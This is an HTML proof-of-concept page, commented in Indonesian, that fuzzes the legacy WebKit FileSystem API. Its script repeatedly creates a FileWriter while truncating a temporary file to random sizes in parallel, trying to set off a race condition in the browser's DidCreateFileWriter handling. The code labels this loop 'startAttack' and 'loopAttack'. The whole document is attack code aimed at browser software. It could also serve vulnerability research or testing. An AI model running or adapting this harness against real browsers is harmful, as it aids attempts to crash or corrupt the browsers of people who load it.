<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FileWriter Unvalidated Length PoC</title>
    <style>
        body { font-family: 'Consolas', monospace; padding: 20px; background: #222; color: #ddd; }
        #console { background: #000; border: 1px solid #444; height: 400px; overflow-y: scroll; padding: 10px; font-size: 12px; }
        .log-info { color: #0f0; }
        .log-warn { color: #ff0; }
        .log-error { color: #f00; }
        .log-crit { color: #f0f; font-weight: bold; }
        button { padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
        button#start { background: #006400; color: white; border: none; }
        button#stop { background: #8b0000; color: white; border: none; }
    </style>
</head>
<body>

    <h2>FileWriter::Initialize Length Race Condition</h2>
    <p>Mencoba memicu <code>DidCreateFileWriter</code> dengan metadata file yang tidak stabil.</p>
    
    <div>
        <button id="start" onclick="startAttack()">Start Fuzzing</button>
        <button id="stop" onclick="stopAttack()">Stop</button>
        <span id="status">Status: Idle</span>
    </div>
    <br>
    <div id="console"></div>

    <script>
        let isRunning = false;
        let fs = null;
        let fileEntry = null;
        let iteration = 0;
        const consoleDiv = document.getElementById('console');
        const statusSpan = document.getElementById('status');

        function log(msg, type = 'log-info') {
            const line = document.createElement('div');
            line.className = type;
            line.textContent = `> ${msg}`;
            consoleDiv.appendChild(line);
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        // 1. Setup FileSystem (Legacy API)
        async function initFS() {
            return new Promise((resolve, reject) => {
                if (!window.webkitRequestFileSystem) {
                    log("ERROR: WebKit File System API not supported in this browser.", "log-error");
                    reject("API Not Supported");
                    return;
                }
                
                // Request 10MB Temporary Storage
                window.webkitRequestFileSystem(window.TEMPORARY, 10 * 1024 * 1024, (filesystem) => {
                    fs = filesystem;
                    log("FileSystem acquired.", "log-info");
                    
                    // Create or get a test file
                    fs.root.getFile('fuzz_target.dat', { create: true }, (entry) => {
                        fileEntry = entry;
                        log("Target file ready: fuzz_target.dat", "log-info");
                        resolve();
                    }, (e) => reject(e));
                }, (e) => reject(e));
            });
        }

        async function startAttack() {
            if (isRunning) return;
            isRunning = true;
            statusSpan.textContent = "Status: RUNNING";
            statusSpan.style.color = "#0f0";
            document.getElementById('start').disabled = true;

            try {
                await initFS();
                log("Starting Race Condition Loop...", "log-warn");
                loopAttack();
            } catch (e) {
                log("Initialization failed: " + e, "log-error");
                isRunning = false;
            }
        }

        function stopAttack() {
            isRunning = false;
            statusSpan.textContent = "Status: STOPPED";
            statusSpan.style.color = "#f00";
            document.getElementById('start').disabled = false;
            log("Attack stopped by user.", "log-error");
        }

        // 2. The Attack Loop
        async function loopAttack() {
            while (isRunning) {
                iteration++;
                
                // Jalankan dua aksi secara paralel untuk memicu race condition
                // 1. Minta Writer (yang akan memanggil DidCreateFileWriter)
                const writerPromise = getWriter();
                
                // 2. Ubah ukuran file secara acak (memaksa backend update metadata)
                const truncatePromise = truncateFileRandomly();

                await Promise.allSettled([writerPromise, truncatePromise]);

                // Delay sangat singkat agar event loop tidak macet tapi race tetap mungkin
                await new Promise(r => setTimeout(r, 0)); 
            }
        }

        // Aksi A: Meminta FileWriter (Entry point ke DidCreateFileWriter)
        function getWriter() {
            return new Promise((resolve) => {
                if (!fileEntry) return resolve();
                
                fileEntry.createWriter(
                    (writer) => {
                        // Jika berhasil dapat writer, segera coba truncate lagi
                        // Ini membebani inisialisasi internal
                        try {
                            // Mencoba truncate ke nilai besar atau negatif (jika JS mengizinkan)
                            // JS biasanya memblokir negatif, tapi kita coba batas integer
                            writer.truncate(0); 
                        } catch(e) {}
                        resolve();
                    },
                    (e) => {
                        // Error biasa dalam race condition
                        resolve(); 
                    }
                );
            });
        }

        // Aksi B: Mengacaukan Metadata File
        function truncateFileRandomly() {
            return new Promise((resolve) => {
                if (!fileEntry) return resolve();

                fileEntry.createWriter(
                    (writer) => {
                        // Generate ukuran acak. 
                        // Catatan: JS tidak bisa mengirim int64 negatif ke API ini secara langsung,
                        // tapi kita bisa mencoba nilai maksimum atau 0 berulang kali.
                        const randomSize = Math.floor(Math.random() * 1024 * 100); 
                        
                        writer.onwriteend = () => resolve();
                        writer.onerror = () => resolve();
                        
                        try {
                            writer.truncate(randomSize);
                        } catch(e) { resolve(); }
                    },
                    (e) => resolve()
                );
            });
        }
    </script>
</body>
</html>
